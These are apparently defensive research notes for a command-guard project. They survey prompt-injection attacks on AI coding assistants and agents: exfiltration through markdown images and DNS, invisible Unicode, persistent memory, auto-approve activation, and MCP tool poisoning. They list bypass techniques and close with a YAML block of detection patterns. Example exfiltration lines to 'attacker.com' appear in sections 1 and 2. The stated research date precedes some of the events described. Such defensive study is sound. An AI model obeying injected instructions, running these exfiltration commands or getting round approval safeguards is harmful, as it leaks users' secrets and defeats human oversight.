# Real-World Prompt Injection Exploits and Data Exfiltration Attacks

> **Research Date**: 2025-01-29
> **Focus**: Documented exploits against AI coding assistants and agents
> **Primary Source**: Johann Rehberger (embracethered.com), security advisories

---

## Key Researcher: Johann Rehberger (Embrace The Red)

Johann Rehberger (@wunderwuzzi) is the leading security researcher in AI prompt injection vulnerabilities. Over 20 years experience in threat modeling and red teaming at Microsoft Azure, Uber, and currently Red Team Director at Electronic Arts.

**Major Contributions:**
- Discovered 20+ vulnerabilities across all major AI coding assistants during "Month of AI Bugs" (August 2025)
- Developed "AgentHopper" - proof-of-concept self-propagating AI virus
- Coined "Cross-Agent Privilege Escalation" attack terminology

---

## 1. Markdown Image Exfiltration (The "Lethal Trifecta")

### How It Works
1. Attacker injects malicious prompt into content the LLM processes
2. Prompt instructs LLM to gather sensitive data and encode it
3. LLM renders markdown image: `![img](https://attacker.com/logo.png?data=BASE64_ENCODED_SECRETS)`
4. Browser/client automatically fetches URL, exfiltrating data without user interaction

### Affected Systems
- **GitHub Copilot Chat** - Fixed by disabling markdown image rendering
- **Microsoft 365 Copilot (EchoLeak - CVE-2025-32711)**
- **ChatGPT with WebPilot plugin**
- **Bing Chat**
- Google Bard, Writer.com, Amazon Q, Google NotebookLM

### The Pattern
> "If your LLM system combines access to private data, exposure to malicious instructions, and the ability to exfiltrate information (through rendering links/images), you have a nasty security hole."

### References
- https://embracethered.com/blog/posts/2024/github-copilot-chat-prompt-injection-data-exfiltration/
- https://www.hackthebox.com/blog/cve-2025-32711-echoleak-copilot-vulnerability
- https://embracethered.com/blog/posts/2023/chatgpt-webpilot-data-exfil-via-markdown-injection/

---

## 2. DNS Exfiltration via Allowlisted Commands

### How It Works
1. AI coding assistants have "safe" commands that run without user approval
2. Commands like `ping`, `dig`, `nslookup`, `host` considered "read-only"
3. Attacker crafts prompt to read secrets and encode them
4. Data exfiltrates via DNS query subdomain: `dig SECRET_DATA.attacker.com`

### CVE-2025-55284 - Claude Code
- Commands `ping`, `host`, `nslookup`, `dig` ran without user confirmation
- Fixed in v1.0.4 (June 2025)
- **This is directly relevant to damage-control**

### Amazon Q Developer
- Same vulnerability pattern
- AWS notably did not issue a CVE

### References
- https://embracethered.com/blog/posts/2025/claude-code-exfiltration-via-dns-requests/
- https://embracethered.com/blog/posts/2025/amazon-q-developer-data-exfil-via-dns/

---

## 3. ASCII Smuggling (Invisible Unicode Exfiltration)

### How It Works
1. Uses Unicode Tag characters (U+E0000 to U+E007F) that mirror ASCII but are invisible
2. LLM embeds sensitive data in invisible characters within clickable hyperlinks
3. User sees normal-looking link but click exfiltrates hidden encoded data

### Attack Chain
1. Prompt injection via malicious email/document
2. Copilot searches for more sensitive data automatically
3. ASCII smuggling creates invisible data payload in user-facing link

### Affected
- Microsoft 365 Copilot - Fixed by no longer rendering links in certain contexts

### References
- https://embracethered.com/blog/posts/2024/m365-copilot-prompt-injection-tool-invocation-and-data-exfil-using-ascii-smuggling/

---

## 4. Memory Persistence Attacks (SpAIware)

### How It Works
1. ChatGPT Memory feature stores context across sessions
2. Attacker injects persistent instructions via document/webpage
3. Instructions survive in memory, affecting ALL future conversations
4. Continuous exfiltration occurs across sessions

### Impact
- Data exfiltrates from future conversations user hasn't even had yet
- Memory persists server-side, survives device changes
- Only clearing memory manually stops the attack

### Fix
- OpenAI restricted URLs to user-provided or public indexed domains only

### References
- https://embracethered.com/blog/posts/2024/chatgpt-macos-app-persistent-data-exfiltration/

---

## 5. Computer Use / Autonomous Agent Exploits

### ZombAIs Attack (October 2024)
- Claude Computer Use weaponized via prompt injection
- Agent navigates to malicious webpage containing prompt injection
- Downloads and executes Sliver C2 framework
- Compromised computer becomes part of botnet ("ZombAI")

### Google Jules Exploits
- Data exfiltration completes before plan approval
- Leaks source code, environment variables from cloned repos
- Attack occurs in main agent, bypassing worker agent restrictions

### GitHub Copilot YOLO Mode
- Rehberger activated `tools.auto-approve` setting via prompt injection
- All subsequent tool calls automatically approved without human oversight

### References
- https://embracethered.com/blog/posts/2024/claude-computer-use-c2-the-zombais-are-coming/
- https://embracethered.com/blog/posts/2025/google-jules-vulnerable-to-data-exfiltration-issues/

---

## 6. MCP (Model Context Protocol) Vulnerabilities

### Attack Types
- **Tool Poisoning:** Malicious instructions in tool descriptions manipulate model
- **Rug Pull:** Tools mutate definitions after installation (safe Day 1, malicious Day 7)
- **mcp-remote CVE-2025-6514:** Command injection via malicious authorization_endpoint

### Notable Incidents (2025)
- **GitHub MCP Server:** Prompt injection in public issue exfiltrated private repo contents including salary data
- **Anthropic Filesystem-MCP:** Sandbox escape and symlink bypass
- **Malicious Postmark MCP:** BCC'd all emails to attacker server

### References
- https://authzed.com/blog/timeline-mcp-breaches
- https://modelcontextprotocol.io/specification/draft/basic/security_best_practices

---

## 7. Bypass Techniques That Worked

| Technique | Description | Target |
|-----------|-------------|--------|
| **Base64 encoding** | LLMs encode/decode base64 well | All systems |
| **CSS invisible text** | `font-size:0`, `color:transparent`, white-on-white | Bing Chat, Google Gemini |
| **Zero-width characters** | Unicode characters invisible in UI | Microsoft Copilot |
| **Reference-style markdown** | Bypassed CSP restrictions in EchoLeak | M365 Copilot |
| **Conditional injections** | Different payloads for different agents (AgentHopper) | Multi-agent systems |
| **Calendar invites** | Prompt injection in event description field | Google Gemini |
| **Context file injection** | Malicious instructions in project config files | Gemini CLI, Cursor |

---

## 8. Defenses: What Worked and What Failed

### Defenses That Failed

| Defense | Why It Failed |
|---------|---------------|
| **Prompt-based guardrails** | Attackers craft prompts that override system instructions |
| **Simple input filtering** | Too many encoding/obfuscation bypasses |
| **AI-based detection alone** | Adaptive attacks exceed 50% success rate |
| **XPIA classifiers** | Bypassed by reference-style markdown links |
| **CSP (Content Security Policy)** | Also bypassed in EchoLeak attack |
| **Trust in "read-only" commands** | DNS queries exfiltrate data |

### Defenses That Showed Effectiveness

| Defense | Implementation |
|---------|----------------|
| **Disable markdown image rendering** | GitHub Copilot's fix - simple and effective |
| **URL allowlisting** | Only user-provided or public indexed domains |
| **Trusted domain validation** | GitLab's `isRelativeUrlWithoutEmbeddedUrls()` function |
| **Remove dangerous commands from allowlist** | Claude Code removed `ping`/`dig`/`nslookup`/`host` |
| **Human-in-the-loop for sensitive operations** | Requires approval before tool execution |
| **Context isolation** | Separate trusted/untrusted data streams |

---

## 9. Architectural Recommendations (From Researchers)

**Johann Rehberger's Core Advice:**
> "Prompt injection cannot be 'fixed.' Security controls need to be applied downstream of LLM output. Effective controls are limiting capabilities, not giving the system access to private data, sandboxed code execution, applying least privilege, human oversight, monitoring, and logging."

**Key Principles:**

1. **Least Privilege** - Only grant minimum necessary permissions
2. **Capability Reduction** - Disable tools not required for the task
3. **Sandboxing** - Isolate agent execution environments
4. **Human Approval Gates** - Require confirmation for sensitive operations
5. **Output Filtering** - Sanitize all LLM outputs deterministically
6. **Context Isolation** - Never mix trusted and untrusted data in same context
7. **Logging and Monitoring** - Detect anomalous tool invocation patterns

---

## Applicability to damage-control

| Exploit Pattern | Current Protection | Gap |
|-----------------|-------------------|-----|
| DNS exfiltration | Not blocked | Add `dig`, `nslookup`, `host`, `ping` to ask patterns |
| Base64 encoding | Not detected | Add base64 + network command detection |
| Markdown image exfil | N/A (not Bash) | Consider PostToolUse for output |
| Memory persistence | N/A | Not applicable to CLI |
| MCP tool poisoning | N/A | Separate concern |
| CSS/Unicode tricks | N/A | Not applicable to CLI |

### Specific Patterns to Add

```yaml
# DNS exfiltration vectors (CVE-2025-55284 pattern)
- pattern: '\b(dig|nslookup|host)\s+.*\.'
  reason: "DNS lookup can exfiltrate data via subdomain"
  ask: true

- pattern: '\bping\s+-c\s*\d+\s+.*\.'
  reason: "Ping with hostname can leak data via DNS"
  ask: true

# Base64 encoding before network
- pattern: '\bbase64\b.*\|\s*(curl|wget|nc)'
  reason: "Base64 encoding before network command - potential exfil"
  ask: true

- pattern: '\bcurl\b.*\$\(.*base64'
  reason: "Curl with base64 encoded data - potential exfil"
  ask: true
```

---

## Source URLs

### Primary Research
- https://embracethered.com/blog/tags/prompt-injection/
- https://simonwillison.net/tags/johann-rehberger/
- https://simonwillison.net/tags/exfiltration-attacks/

### Specific Exploits
- https://embracethered.com/blog/posts/2024/github-copilot-chat-prompt-injection-data-exfiltration/
- https://embracethered.com/blog/posts/2025/claude-code-exfiltration-via-dns-requests/
- https://embracethered.com/blog/posts/2025/amazon-q-developer-data-exfil-via-dns/
- https://embracethered.com/blog/posts/2024/m365-copilot-prompt-injection-tool-invocation-and-data-exfil-using-ascii-smuggling/
- https://embracethered.com/blog/posts/2024/chatgpt-macos-app-persistent-data-exfiltration/
- https://embracethered.com/blog/posts/2024/claude-computer-use-c2-the-zombais-are-coming/
- https://embracethered.com/blog/posts/2025/google-jules-vulnerable-to-data-exfiltration-issues/
- https://embracethered.com/blog/posts/2023/bing-chat-data-exfiltration-poc-and-fix/
- https://www.hackthebox.com/blog/cve-2025-32711-echoleak-copilot-vulnerability
- https://noma.security/blog/geminijack-google-gemini-zero-click-vulnerability/

### Defense Research
- https://www.microsoft.com/en-us/msrc/blog/2025/07/how-microsoft-defends-against-indirect-prompt-injection-attacks
- https://support.google.com/a/answer/16479560
- https://genai.owasp.org/llmrisk/llm01-prompt-injection/
- https://www.lakera.ai/blog/indirect-prompt-injection
- https://modelcontextprotocol.io/specification/draft/basic/security_best_practices

### Conference Talks
- https://media.ccc.de/v/39c3-agentic-probllms-exploiting-ai-computer-use-and-coding-agents
- https://embracethered.com/blog/downloads/HITCON_CMT_Indirect_Prompt_Injections_2023_v1.0.pdf
